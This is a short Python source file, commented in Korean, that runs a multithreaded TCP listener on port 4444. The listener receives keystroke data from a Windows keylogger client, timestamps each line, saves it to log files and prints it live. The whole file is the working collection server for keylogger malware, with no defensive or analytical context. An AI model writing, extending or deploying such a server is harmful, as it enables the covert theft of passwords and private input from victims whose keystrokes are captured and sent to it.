import socket
import threading
import datetime
import os

HOST = '0.0.0.0'
PORT = 4444

log_dir = "received_keylogs"
os.makedirs(log_dir, exist_ok=True)

timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
log_file = f"{log_dir}/keylog_windows_{timestamp}.log"

def handle_client(conn, addr):
    print(f"[+] Connected from {addr}")
    
    with open(log_file, "a", encoding='utf-8') as f:
        f.write(f"=== Session from {addr} started at {datetime.datetime.now()} ===\n")
        f.flush()

        buffer = ""   # ← 실시간 처리에 중요

        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    print(f"[-] Client {addr} disconnected")
                    break

                buffer += data.decode('utf-8', errors='ignore')

                # 개행 기준으로 잘라서 실시간 처리
                while '\n' in buffer:
                    line, buffer = buffer.split('\n', 1)
                    line = line.strip()
                    if not line:
                        continue

                    now = datetime.datetime.now().strftime('%H:%M:%S')
                    log_entry = f"{now} | {line}"

                    # 1. 파일에 저장
                    f.write(log_entry + "\n")
                    f.flush()

                    # 2. 콘솔에 실시간 출력
                    print(f"[KEY] {log_entry}")

            except Exception as e:
                print(f"[-] Error with {addr}: {e}")
                break

    print(f"[-] Disconnected from {addr}")
    conn.close()


def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # 포트 재사용
        s.bind((HOST, PORT))
        s.listen(5)
        print(f"[*] Listening on {HOST}:{PORT} | Waiting for keylogger...")

        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    start_server()
